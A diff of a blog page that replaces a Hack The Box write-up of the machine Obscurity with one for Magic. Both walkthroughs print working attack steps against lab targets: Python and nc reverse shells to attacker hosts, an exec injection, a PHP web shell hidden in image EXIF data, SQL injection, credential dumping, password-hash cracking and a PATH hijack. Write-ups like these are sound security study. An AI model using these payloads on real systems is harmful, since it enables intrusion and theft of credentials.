@@ -3,33 +3,33 @@
 <head>
     <meta charset="utf-8">
 
-    <title>HTB Write-up | Obscurity</title>
+    <title>HTB Write-up | Magic</title>
 
     <meta name="HandheldFriendly" content="True" />
     <meta name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1">
 
     <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon" />
-    <link rel="canonical" href="https://inesmartins.github.io//htb-walkthrough-obscurity/" />
+    <link rel="canonical" href="https://inesmartins.github.io//dnp-htb-write-up/" />
     <meta name="referrer" content="no-referrer-when-downgrade" />
     
     <meta property="og:site_name" content="Inês Martins" />
     <meta property="og:type" content="article" />
-    <meta property="og:title" content="HTB Write-up | Obscurity" />
-    <meta property="og:description" content="Write-up for Obscurity, a retired HTB Linux machine." />
-    <meta property="og:url" content="https://inesmartins.github.io//htb-walkthrough-obscurity/" />
-    <meta property="og:image" content="https://inesmartins.github.io//content/images/2020/06/1-1.png" />
-    <meta property="article:published_time" content="2020-06-07T17:54:05.000Z" />
-    <meta property="article:modified_time" content="2020-12-08T10:38:05.000Z" />
+    <meta property="og:title" content="HTB Write-up | Magic" />
+    <meta property="og:description" content="Retired machine can be found here. ScanningAs always, we start with some basic scanning which discloses only an instance of OpenSSH running on port 22 and an Apache web server running on port 80 - pretty typical stuff. ~ nmap -sV -sC -A magic.htb Starting Nmap 7.80 ( https://nmap." />
+    <meta property="og:url" content="https://inesmartins.github.io//dnp-htb-write-up/" />
+    <meta property="og:image" content="https://inesmartins.github.io//content/images/2020/08/magic.png" />
+    <meta property="article:published_time" content="2020-08-27T12:14:17.000Z" />
+    <meta property="article:modified_time" content="2020-09-26T11:33:52.000Z" />
     <meta name="twitter:card" content="summary_large_image" />
-    <meta name="twitter:title" content="HTB Write-up | Obscurity" />
-    <meta name="twitter:description" content="Write-up for Obscurity, a retired HTB Linux machine." />
-    <meta name="twitter:url" content="https://inesmartins.github.io//htb-walkthrough-obscurity/" />
-    <meta name="twitter:image" content="https://inesmartins.github.io//content/images/2020/06/1-1.png" />
+    <meta name="twitter:title" content="HTB Write-up | Magic" />
+    <meta name="twitter:description" content="Retired machine can be found here. ScanningAs always, we start with some basic scanning which discloses only an instance of OpenSSH running on port 22 and an Apache web server running on port 80 - pretty typical stuff. ~ nmap -sV -sC -A magic.htb Starting Nmap 7.80 ( https://nmap." />
+    <meta name="twitter:url" content="https://inesmartins.github.io//dnp-htb-write-up/" />
+    <meta name="twitter:image" content="https://inesmartins.github.io//content/images/2020/08/magic.png" />
     <meta name="twitter:label1" content="Written by" />
     <meta name="twitter:data1" content="Inês Martins" />
     <meta name="twitter:site" content="@inesmartns" />
-    <meta property="og:image:width" content="594" />
-    <meta property="og:image:height" content="377" />
+    <meta property="og:image:width" content="598" />
+    <meta property="og:image:height" content="381" />
     
     <script type="application/ld+json">
 {
@@ -58,17 +58,17 @@
         "url": "https://inesmartins.github.io//author/ines/",
         "sameAs": []
     },
-    "headline": "HTB Write-up | Obscurity",
-    "url": "https://inesmartins.github.io//htb-walkthrough-obscurity/",
-    "datePublished": "2020-06-07T17:54:05.000Z",
-    "dateModified": "2020-12-08T10:38:05.000Z",
+    "headline": "HTB Write-up | Magic",
+    "url": "https://inesmartins.github.io//dnp-htb-write-up/",
+    "datePublished": "2020-08-27T12:14:17.000Z",
+    "dateModified": "2020-09-26T11:33:52.000Z",
     "image": {
         "@type": "ImageObject",
-        "url": "https://inesmartins.github.io//content/images/2020/06/1-1.png",
-        "width": 594,
-        "height": 377
+        "url": "https://inesmartins.github.io//content/images/2020/08/magic.png",
+        "width": 598,
+        "height": 381
     },
-    "description": "Write-up for Obscurity, a retired HTB Linux machine.",
+    "description": "Retired machine can be found here\n[https://www.hackthebox.eu/home/machines/profile/241].\n\nScanning\nAs always, we start with some basic scanning which discloses only an instance of \nOpenSSH running on port 22 and an Apache web server running on port 80 - pretty\ntypical stuff.\n\n~ nmap -sV -sC -A magic.htb\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-09 15:10 WEST\nNmap scan report for magic.htb (10.10.10.185)\nHost is up (0.046s latency).\nNot shown: 998 closed ports\nPORT   STATE SERVICE VERSIO",
     "mainEntityOfPage": {
         "@type": "WebPage",
         "@id": "https://inesmartins.github.io//"
@@ -100,118 +100,71 @@
         <article class="post">
 
             <header class="post-header">
-                <h1 class="post-title">HTB Write-up | Obscurity</h1>
+                <h1 class="post-title">HTB Write-up | Magic</h1>
                 <section class="post-meta">
                     <p class="author">by <a href="/author/ines/">Inês Martins</a></p>
-                    <time class="post-date" datetime="2020-06-07">2020-06-07</time>
+                    <time class="post-date" datetime="2020-08-27">2020-08-27</time>
                 </section>
             </header>
             <figure class="post-image">
-                <amp-img src="https://inesmartins.github.io//content/images/2020/06/1-1.png" width="600" height="400" layout="responsive"></amp-img>
+                <amp-img src="https://inesmartins.github.io//content/images/2020/08/magic.png" width="600" height="400" layout="responsive"></amp-img>
             </figure>
             <section class="post-content">
 
-                <p><em>Retired machine can be found <a href="https://www.hackthebox.eu/home/machines/profile/219">here</a>.</em></p><h2 id="scanning">Scanning</h2><p>After doing an initial scan with <code>nmap</code>, we find that this is a Linux (Ubuntu) machine with 2 exposed services: <code>OpenSSH</code> on port 22 and a custom web server on port 8080.</p><pre><code>$ nmap -sC -sV -A obscurity.htb
+                <p><em>Retired machine can be found <a href="https://www.hackthebox.eu/home/machines/profile/241">here</a>.</em></p><h2 id="scanning">Scanning</h2><p>As always, we start with some basic scanning which discloses only an instance of <code>OpenSSH</code> running on port 22 and an <code>Apache</code> web server running on port 80 - pretty typical stuff.</p><pre><code>~ nmap -sV -sC -A magic.htb
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-09 15:10 WEST
+Nmap scan report for magic.htb (10.10.10.185)
+Host is up (0.046s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca (RSA)
+|   256 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 (ECDSA)
+|_  256 71:05:99:1f:a8:1b:14:d6:03:85:53:f8:78:8e:cb:88 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Magic Portfolio
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
-22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
-8080/tcp open http-proxy BadHTTPServer
-```</code></pre>
-<p>There is some content on the website which has some useful information:</p><figure class="kg-card kg-image-card kg-width-wide"></figure><figure class="kg-card kg-image-card kg-width-wide"></figure><figure class="kg-card kg-image-card kg-width-wide"></figure><p>So, now we know there is a file called <code>SuperSecureServer.py</code> which is in "the secret development directory". I used <a href="https://tools.kali.org/web-applications/wfuzz">wfuzz</a> to find it but you could probably just get it logically:</p><pre><code>$ wfuzz -w SecLists/Discovery/Web-Content/api/actions.txt --hc 404 http://obscurity.htb:8080/FUZZ/SuperSecureServer.py
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 9.89 seconds
 </code></pre>
-<p>The mystery directory is <code>develop</code>, so know we have access to <a href="http://obscurity.htb:8080/develop/SuperSecureServer.py">the server's source code</a>, in the form of a Python script: <br />While analysing it, we find something interesting:</p><figure class="kg-card kg-image-card"></figure><p>Here's our foothold: we can exploit this <a href="https://www.w3schools.com/python/ref_func_exec.asp">exec</a> and get us a shell as <code>wwwdata</code>.</p><pre><code>$ wget http://obscurity.htb:8080/';%20s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('[ATTACKER_IP]',[ATTACKER_PORT]));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);a%20=%20'
+<p>The website is just a simple image gallery, but there is a link to a login form on the bottom left.</p><figure class="kg-card kg-image-card"></figure><p>Bypassing authentication was pretty straightforward with <a href="https://owasp.org/www-community/attacks/SQL_Injection">SQL Injection</a> - I think this was my first attempt.</p><figure class="kg-card kg-image-card"></figure><p>Once the login succeeds, we're redirected to an <a href="http://10.10.10.185/upload.php">Upload</a> page.</p><figure class="kg-card kg-image-card"></figure><h2 id="bypassing-upload-filters">Bypassing Upload Filters</h2><p>This upload feature only accepts JPG, JPEG or PNG files. This is validated by checking both file extension and MIME type, so uploading a PHP script directly is out of the question. </p><p>To get around these restrictions I ended up following <a href="https://medium.com/bugbountywriteup/hackthebox-networked-93ebbd6a70e3">this</a> tutorial:</p><ol><li>Create a script that lets us execute any command on the machine, with the help of the <a href="https://www.php.net/manual/en/function.passthru.php">passthru</a> function:</li></ol><figure class="kg-card kg-image-card kg-card-hascaption"><figcaption>Source: <a href="https://medium.com/bugbountywriteup/hackthebox-networked-93ebbd6a70e3">https://medium.com/bugbountywriteup/hackthebox-networked-93ebbd6a70e3</a></figcaption></figure><p>2. Embed the script in a valid image using <a href="http://steghide.sourceforge.net/">steghide</a>:</p><pre><code>$ steghide embed -cf dog.jpg -ef shell.php
 </code></pre>
-<hr></hr><h2 id="getting-user">Getting user</h2><p>It seems like our first goal is to become <code>robert</code>.</p><pre><code>$ cat etc/passwd
+<p>3. Manipulate the EXIF data:</p><pre><code>$ exiftool -Comment='&lt;?php echo "&lt;pre&gt;"; system($_GET['cmd']); ?&gt;' dog.jpg
+</code></pre>
+<p>4. Change the file extension:</p><pre><code>$ mv dog.jpg dog.php.jpg
+</code></pre>
+<p>Finally, we get an RCE, which we use to get a reverse shell:</p><pre><code>http://10.10.10.185/images/uploads/dog.php.jpg?cmd=./nc%2010.10.15.114%204444%20-e%20/bin/sh
+</code></pre>
+<h2 id="getting-user">Getting User</h2><p>Authenticated as <code>wwwdata</code>, we start poking around the web server files and find the credentials for the mySQL database, which then allows us to dump the contents of the app's database using the <a href="https://dev.mysql.com/doc/refman/8.0/en/mysqldump.html">mysqldump</a> binary:</p><pre><code>~ /usr/bin/mysqldump --user=theseus --password=iamkingtheseus Magic login &gt; /var/www/Magic/dbdump.sql
+
+~ cat /var/www/Magic/dbdump.sq
 ...
-robert:x:1000:1000:robert:/home/robert:/bin/bash
+INSERT INTO `login` VALUES (1,'admin','Th3s3usW4sK1ng');
+...
 </code></pre>
-<p>Listing the contents of <code>robert</code>'s home directory, we get some interesting files:</p><pre><code>$ ls /home/robert
-BetterSSH/BetterSSH.py
-check.txt
-out.txt
-passwordreminder.txt
-SuperSecureCrypt.py
-user.txt
+<p>We now have credentials for the user <code>theseus</code> but need to upgrade our shell to be able to authenticate, since SSH access is only enabled with RSA.</p><pre><code>http://10.10.10.185/images/uploads/dog.php.jpg?cmd=/usr/bin/python3 -c 'import pty;import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.52",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
 </code></pre>
-<pre><code>$ cat check.txt
-Encrypting this file with your key should result in out.txt, make sure your key is correct!
-
-$ cat out.txt
-¦ÚÈêÚÞØÛÝÝ‰×ÐÊß…ÞÊÚÉ’æßÝËˆÚÛÚêÙÉëéÑÒÝÍÐ…êÆáÙÞã–ÒÑˆÐáÙ¦ÕæØžãÊÎÍßÚêÆŽÝáäè‰ÎÍÚŒÎëÑÓäáÛÌ×‰v
-
-$ cat passwordreminder.txt
-´ÑÈÌÉàÙÁÑé¯·¿
+<p>With this interactive shell we can now authenticate via <code>su</code>.</p><pre><code>www-data@ubuntu:/var/www/Magic/images/uploads$ su - theseus
+Password: Th3s3usW4sK1ng
+theseus@ubuntu:~$ </code></pre>
+<h2 id="path-to-root">Path to Root</h2><p>Root was a lot more straightforward. We started by running <a href="https://github.com/Anon-Exploiter/SUID3NUM">SUID3NUM</a> which found only one noteworthy file - <code>/bin/sysinfo</code> - so we investigate it.</p><pre><code>~ strings /bin/sysinfo
+...
+setuid
+...
+====================Hardware Info====================
+lshw -short
+...
 </code></pre>
-<p>So, by encrypting <code>check.txt</code> with an unknown algorithm we get <code>out.txt</code>.<br />Also, when use we this key to encrypt <code>robert</code>'s password we get the content of <br /><code>passwordreminder.txt</code>.</p><p>This is a classic <a href="https://en.wikipedia.org/wiki/Known-plaintext_attack">known-plaintext attack</a>.<br />Let's create a script to find the key!</p><pre><code>import sys
-
-# extend alphabet if necessary
-alphabet = "abcdefghijklmnopqrstuvwyxzABCDEFGHIJKLMNOPQRSTUVWYXZ"
-
-def decode_ciphertext(ciphertext, key):
-    key_pos = 0
-    plaintext = ""
-    for x in ciphertext:
-        new_char = chr((ord(x) - ord(key[key_pos])) % 255)
-        plaintext += new_char
-        key_pos += 1
-        key_pos = key_pos % len(key)
-    return plaintext
-
-def get_key(p1, c1):
-    i = 0
-    key = ""
-    while i &lt; len(p1):
-        found_match = False
-        for x in alphabet:
-            new_char = chr((ord(p1[i]) + ord(x)) % 255)
-            if new_char == c1[i]:
-                print("Found match, current key is " + key)
-                found_match = True
-                i += 1
-                key += x
-        if found_match == False:
-            print("Couldn't find match for char at index " + str(i))
-            return 0
-    return key
-
-def main(argv):
-    p1 = open(argv[0], "r").read()
-    c1 = open(argv[1], "r").read()
-    c2 = open(argv[2], "r").read()
-
-    print("\nKnown plaintext: \n" + p1)
-    print("Known ciphertext: \n" + c1)
-    print("Ciphertext to decode: \n" + c2)
-
-    key = get_key(p1, c1)
-    if key == 0:
-        print("Unable to calculate key!")
-    else:
-        p2 = decode_ciphertext(c2, key)
-        print("Original plaintext: " + p2)
-
-if __name__ == "__main__":
-    if len(sys.argv) &lt; 3:
-        print("Please specify the following arguments:")
-        print("[0] known plaintext file")
-        print("[1] known ciphertext file")
-        print("[2] ciphertext to decode")
-    else:
-        main(sys.argv[1:])</code></pre><p>Now that we have <code>robert</code>'s password we can <code>SSH</code> into the machine, get the user flag and move on to root. </p><h2 id="getting-root">Getting root</h2><p>We start by doing some enumeration with <a href="https://github.com/rebootuser/LinEnum">LinEnum</a>:</p><pre><code>$ ./LinEnum.sh...
-User robert may run the following commands on obscure:
-(ALL) NOPASSWD: /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
--e
+<p>As we can see above, the file runs <a href="https://en.wikipedia.org/wiki/Setuid">setuid</a> at one point and right after it prints the output of the <a href="http://manpages.ubuntu.com/manpages/trusty/man1/lshw.1.html">lshw</a> (list hardware) binary. However, there is no path to this binary, which means we can alter the <code>$PATH</code> so that instead of the actual <code>lshw</code> binary, we can get root to run our fake <code>lshw</code>, which prints out the root flag:</p><pre><code>theseus@ubuntu:~$ mkdir /tmp/.abc
+theseus@ubuntu:~$ export PATH=/tmp/.abc:$PATH
+theseus@ubuntu:~$ touch /tmp/.abc/lshw
+theseus@ubuntu:~$ echo "cat /root/root.txt" &gt;&gt; /tmp/.abc/lshw
+theseus@ubuntu:~$ chmod 777 /tmp/.abc/lshw
 </code></pre>
-<p>Let's run <code>BetterSSH</code> as sudo to test this:</p><pre><code>$ sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
-Enter username: robert
-Enter password: xxx
-Authed!
-</code></pre>
-<p>After looking at <code>BetterSSH.py</code> we realise there's a vulnerability we can exploit: we can read the passwords that are stored on /etc/shadow for a period of time on <code>/tmp/SSH/</code>.</p><figure class="kg-card kg-image-card"></figure><p>So we create a script to print them to a file we can read after the process is finished (<code>/tmp/o.txt</code>):</p><figure class="kg-card kg-image-card"></figure><p>Finally, we use <a href="https://www.openwall.com/john/">JohnTheRipper</a> to crack the hash:</p><pre><code>$ echo "root:$6$riekpK4m$uBdaAyK0j9WfMzvcSKYVfyEHGtBfnfpiVbYbzbVmfbneEbo0wSijW1GQussvJSk8X1M56kzgGj8f7DFN1h4dy1:18226:0:99999:7" &gt; shadow
-$ echo "root:x:0:0:root:/root:/bin/bash" &gt; passwd
-$ unshadow passwd shadow &gt; crack.password.db
-$ john crack.password.db
-</code></pre>
-<p>That's it, hope you enjoyed it!</p>
+<p>Now, we just need to run the <code>sysinfo</code> binary and in the output there's the root flag instead of the <code>lshw</code> output.</p>
 
             </section>
 
